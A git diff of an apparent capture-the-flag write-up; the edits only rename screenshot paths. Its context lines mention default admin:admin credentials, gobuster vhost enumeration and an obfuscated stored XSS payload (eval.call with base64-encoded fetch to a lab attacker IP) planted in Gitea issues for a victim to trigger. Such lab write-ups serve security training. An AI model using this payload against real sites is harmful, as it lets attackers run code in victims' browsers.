@@ -20,7 +20,7 @@ The Get Started button directs us to a login page, where default admin:admin cre
 
 For this particular domain, there are tons of vhosts when using gobuster to scan it.
 
-<figure><img src="../../../.gitbook/assets/image (145).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (145) (1).png" alt=""><figcaption></figcaption></figure>
 
 The most interesting of all was the first one, which hosted a Gitea instance.
 
@@ -194,7 +194,7 @@ After some more testing, I come across the eval.call XSS method through the page
 
 This is the payload used: `test<test><img SRC="x" onerror=eval.call${"eval\x28atobZmV0Y2goImh0dHA6Ly8xMC4xMC4xNC41LyIp\x29"}>`
 
-<figure><img src="../../../.gitbook/assets/image (140).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (140) (1).png" alt=""><figcaption></figcaption></figure>
 
 What this does is essentially is `fetch('http://10.10.x.x')` for Charlie to execute upon looking at the issues.
 
